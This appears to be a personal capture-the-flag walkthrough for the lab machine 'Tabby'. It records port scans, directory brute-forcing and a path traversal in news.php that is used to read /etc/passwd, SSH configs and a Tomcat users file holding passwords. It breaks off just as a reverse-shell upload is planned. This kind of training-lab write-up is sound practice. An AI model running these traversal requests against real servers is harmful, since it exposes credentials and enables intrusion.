# tabby

```sh
## kali

sudo su -
cd projects
mkdir tabby
cd tabby
mkdir share
mkdir foothold
mkdir exfil
mkdir privesc

nv /etc/local # add: 10.10.10.194 tabby

sup tabby # nmap scans.

so tabby # scan summary and setting vars.

# 22 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
ssh tabby # denied, publickey

# 80 Apache httpd 2.4.41 ((Ubuntu))
  # browser ->
    # nothing on the quick

# 8080 Apache Tomcat
  # browser -> open all links
    # /docs -> Apache Tomcat 9 (Version 9.0.31, Feb 24 2020)
    # /examples -> are installed
    # /manager & /host-manager -> ask for password (401 gives info)
    # users are defined in /etc/tomcat9/tomcat-users.xml

dirb http://tabby/ -o dirb80.log
dirb http://tabby:8080/ -o dirb8080.log

tail -F *.log | grep --line-buffered ^==
```

```sh
## vmhost

# local port forwarding so we can browse the sites from outside kali:
ssh -N kali -L 0.0.0.0:80:tabby:80
ssh -N kali -L 0.0.0.0:8080:tabby:8080

# port 80
# wappalyzer: apache 2.4.41, ubuntu

# port 8080
# wappalyzer: apache 2.4.41, ubuntu

# no new info :/
```

```sh
## kali

# port 22
searchsploit openssh 8 # nothing useful.
# https://www.cybersecurity-help.cz/vdb/SB2020052708

# port 80
searchsploit apache 2 # no public exploit for 2.4.41.

# port 8080
searchsploit tomcat
# https://tomcat.apache.org/security-9.html
# nothing useful.
```

---

I mean the box is called `tabby` so it's probably a Tomcat exploit.

```sh
grep ^== dirb* # nothing interesting.
```
* port 8080 via browser, still nothing
* port 80 via browser:
* some links point to megahosting.htb
* try them with the server.
  * `news.php` with `file` parameter!
* let's try passing some files:
  * first the one from the page:
    * `/news.php?file=statement`
      * nice apology
    * `/news.php?file=index.html`
      * empty page
* let's switch to curl

```sh
## kali
curl -s tabby > index80.html
grep .htb index80.html # a mail address and the aforementioned news.php

curl tabby/news.php?file=statement # yep, it's still the statement.
curl tabby/news.php?file=index.html # empty.
curl tabby/news.php?file=index.php # empty.
curl tabby/news.php?file=../index.html # empty.
curl tabby/news.php?file=../index.php # jackpot! it's the root index file.
curl tabby/news.php?file=../../index.php # empty.

# let's try breaking out and fetching a file that was mentioned on tabby:8080
curl tabby/news.php?file=../../../../../../../var/lib/tomcat9/webapps/ROOT/index.html # it works!

# when we entered a wrong password, tabby:8080/manager/html mentioned conf/tomcat-users.xml
curl tabby/news.php?file=../../../../../../../var/lib/tomcat9/conf/tomcate-users.xml # empty :(

# whoops, one an errant e
curl tabby/news.php?file=../../../../../../../var/lib/tomcat9/conf/tomcat-users.xml # nope.
curl tabby/news.php?file=../../../../../../../var/lib/tomcat9/webapps/conf/tomcat-users.xml # nope.
curl tabby/news.php?file=../../../../../../../var/lib/tomcat9/webapps/ROOT/conf/tomcat-users.xml # nope.

# let's google the location for tomcat-users.xml

# $CATALINA_BASE/conf/tomcat-users.xml
# $CATALINA_BASE is /var/lib/tomcat9
# should work, but does not.

# remove ../ until we find the last that works. 4 are enough to get to the root dir.
# try something else:
cd exfil
curl tabby/news.php?file=../../../../usr/share/doc/tomcat9-common/RUNNING.txt.gz --output RUNNING.txt.gz
gunzip *.gz

# read it.
# try another path:
curl tabby/news.php?file=../../../../etc/hosts # works.

# let's look for the ubuntu tomcat package:
# https://packages.ubuntu.com/search?keywords=tomcat9
# I don't know the exact Ubuntu version, I'm assuming they are all similar:
# https://packages.ubuntu.com/focal/all/tomcat9/filelist
curl tabby/news.php?file=../../../../../etc/cron.daily/tomcat9 # works. good start.
curl tabby/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml # YES!

# let's download it:
curl tabby/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml -o tomcat-users.xml
grep password *.xml

# let's try those credentials:
# tabby:8080/manager/html # nope
  # can we find those creds too?
# tabby:8080/manager/host-manager # yes!
  # now we have access to the Tomcat Virtual Host Manager
```

Wait a minute!

```sh
## kali
# totally forgot, there's ssh running!
curl tabby/news.php?file=../../../../../etc/ssh/sshd_config > sshd_config
curl tabby/news.php?file=../../../../../etc/ssh/ssh_config > ssh_config
# private keys can't be fetched, oh well.
```

Maybe the webserver on port 80

```sh
curl tabby/news.php?file=../../../../var/www/html/index.php
# maybe we can get news.php
curl tabby/news.php?file=../../../../var/www/html/news.php > news.php # yes!
curl tabby/news.php?file=../../../../var/www/html/index.php > index.php # might as well.
curl tabby/news.php?file=../../../../lib/systemd/system/tomcat9.service > tomcat9.service # should give us the paths.

curl http://tabby/news.php?file=../../../../etc/passwd > passwd # at least we will get the usernames.
egrep -v "bin/nologin|bin/false" passwd
# we found a new user: ash
# can't manage to extract any info though.
```
---

Alright, after a couple of hours I've looked up a hint:
The idea is to upload a shell via the Tomcat manager.
(I did not know you could upload things, so I would have
not figured that out anytime soon.)

* http://tabby:8080/host-manager/html
  * click server status
  * click complete server status
    * (http://tabby:8080/manager/status/all)
    * take a look at the applications
      * let's add our own
      * as soon as we call it our payload will be executed
      * let's create a TCP reverse shell


```sh

```
